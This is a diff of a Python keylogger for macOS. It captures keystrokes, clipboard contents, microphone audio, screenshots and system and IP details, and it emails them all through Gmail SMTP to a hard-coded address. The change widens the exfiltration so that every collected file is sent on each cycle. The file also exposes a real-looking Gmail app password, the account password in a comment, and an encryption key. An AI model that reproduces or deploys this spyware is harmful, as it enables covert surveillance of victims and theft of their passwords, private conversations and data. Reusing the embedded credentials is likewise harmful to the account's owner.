@@ -1,69 +1,71 @@
+#Email modules
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
-import subprocess
 
-#Default Modules for Collection
+#Modules for computer information collection
 import socket
 import platform
+from requests import get
 
-#Clipboard Module
-#import win32clipboard
-#https://stackoverflow.com/questions/1825692/can-python-send-text-to-the-mac-clipboard
+#Copy cliboard module
+import subprocess
 
-#Keystrokes 
-from pynput.keyboard import Key, Listener
-
-#Time
-import time
-import os
-
-#Microphone
+#Microphone modules
 from scipy.io.wavfile import write
 import sounddevice as sd
 
-#Cryptography for encryption
-from cryptography.fernet import Fernet
-
-#Gitpass for username and requests for information
-import getpass
-from requests import get
-
 #Screenshot image grab
-from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
-#default controls
+#Keystroke module
+from pynput.keyboard import Key, Listener
+
+#Cryptography module for .txt encryption
+from cryptography.fernet import Fernet
+
+#Datetime module
+from datetime import date
+from datetime import datetime
+import time
+
+#Files to be updated
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
-email_address =  "keylogger4214389@gmail.com"
-#password = gr@ntColl1nsKEY##
-app_password = "ohtzogcxovolgjja"
-
-
-microphone_time = 10
 audio_information = "audio.wav"
+screenshot_information = "screenshot.png"
 
+#Default email values
+email_address =  "keylogger4214389@gmail.com"
+app_password = "ohtzogcxovolgjja" #Password: gr@ntColl1nsKEY##
+toaddress = "keylogger4214389@gmail.com"
+
+#Default time & iteration values
+microphone_time = 10
+time_iteration = 10
+number_of_iterations = 0
+number_of_iterations_end = 2
+datenow = date.today()
+timenow = datetime.now().strftime("%H:%M:%S")
+currentTime = time.time()
+stoppingTime = time.time() + time_iteration
+
+#Encryption
+key = "aK9Aamh-txCxirHhCLEZ-phPxpQRUTEXhBHigOeF30Q="
 keys_information_encrypted = "encrypted_key_log.txt"
 system_information_encrypted = "encrypted_systeminfo.txt"
 clipboard_information_encrypted = "ecrypted_clipboard.txt"
 
-screenshot_information = "screenshot.png"
-time_iteration = 15
-number_of_iterations_end = 3
-
-toaddress = "keylogger4214389@gmail.com"
-key = "aK9Aamh-txCxirHhCLEZ-phPxpQRUTEXhBHigOeF30Q="
-
-
+#Filepaths
 file_path = "/Users/rickyanashita/Developer/Python-Keylogger"
 extend = "/"
 file_merge = file_path + extend
 
-def send_email(filename, attachment, toaddress):
+#The function that sends an email containing a keylog. 
+def send_email(toaddress):
 
     fromaddress = email_address
 
@@ -71,22 +73,23 @@ def send_email(filename, attachment, toaddress):
 
     msg['From'] = fromaddress
     msg['To'] = toaddress
-    msg['Subject'] = "New Log File"
+    msg['Subject'] = "New Python Log File"
 
-    body = "Body of the mail"
+    body = "Log File with keylog, computer information, clipboard contents, microphone recording, and screenshot. \nInformation logged at " + str(timenow) + " on " + str(datenow)
     msg.attach(MIMEText(body, 'plain'))
 
-    filename = filename
-    attachment = open(attachment, 'rb')
-    
-    p = MIMEBase('application', 'octet-stream')
+    filenames = [ keys_information, system_information, clipboard_information, audio_information, screenshot_information ]
+    attachments = [file_merge + keys_information, file_merge + system_information, file_merge + clipboard_information, file_merge + audio_information, file_merge + screenshot_information]
 
-    p.set_payload((attachment).read())
-    encoders.encode_base64(p)
+    for x in range(4):
+        filename = filenames[x]
+        attachment = open(attachments[x], 'rb')
 
-    p.add_header('Content-Disposition', "attachment: filename=%s" % filename)
-
-    msg.attach(p)
+        p = MIMEBase('application', 'octet-stream')
+        p.set_payload((attachment).read())
+        encoders.encode_base64(p)
+        p.add_header('Content-Disposition', "attachment: filename=%s" % filename)
+        msg.attach(p)
 
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
@@ -98,6 +101,7 @@ def send_email(filename, attachment, toaddress):
 
 # send_email(keys_information, file_path + extend + keys_information, toaddress)
 
+#The function that collects information on the mac device and system being monitored. 
 def computer_information():
     with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
@@ -108,27 +112,27 @@ def computer_information():
         except:
             f.write("Couldn't get public IP Adress. Max Query")
         
-        f.write("Processor: " + (platform.processor()) + '\n')
-        f.write("System: " + platform.system() + " " + platform.version() + '\n')
-        f.write("Machine: " + platform.machine() + '\n')
-        f.write("Hostname: " + hostname + '\n')
         f.write("Private IP Address: " + IPAddress + '\n')
-    
-computer_information() 
+        f.write("Hostname: " + hostname + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Processor: " + (platform.processor()) + '\n')
+        
+# computer_information() 
 
+#The function that copies the information on the clipboard
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
-            cp = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
-            cp.wait
-            pasted_data = cp.stdout.read()
-            f.write("Clipboard Data: \n" + pasted_data)
-
+            #https://stackoverflow.com/questions/1825692/can-python-send-text-to-the-mac-clipboard
+            pasted_data = subprocess.check_output('pbpaste', env={'LANG': 'en_US.UTF-8'}).decode('utf-8')
+            f.write("Clipboard Data: " + pasted_data + "\n")
         except:
             f.write("Clipboard could not be copied. Clipboard may contain other media")
 
-copy_clipboard()
+# copy_clipboard()
 
+#The function that creates a .wav recording through the system's microphone
 def microphone():
     fs = 44100
     seconds = microphone_time
@@ -140,15 +144,12 @@ def microphone():
 
 # microphone()
 
+#The function that takes a screenshot of the device's screen
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_information)
 
-screenshot()
-
-number_of_iterations = 0
-currentTime = time.time()
-stoppingTime = time.time() + time_iteration
+# screenshot()
 
 while number_of_iterations < number_of_iterations_end:
     count = 0
@@ -176,7 +177,6 @@ while number_of_iterations < number_of_iterations_end:
                     f.write(k)
                     f.close()
 
-
     def on_release(key):
         if key == Key.esc:
             return False
@@ -190,9 +190,11 @@ while number_of_iterations < number_of_iterations_end:
         with open(file_path + extend + keys_information, "w") as f: 
             f.write(" ")
         
-        screenshot()
-        send_email(screenshot_information, file_path + extend + screenshot_information, toaddress)
+        computer_information()
         copy_clipboard()
+        microphone()
+        screenshot()
+        send_email(toaddress)
         number_of_iterations += 1
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
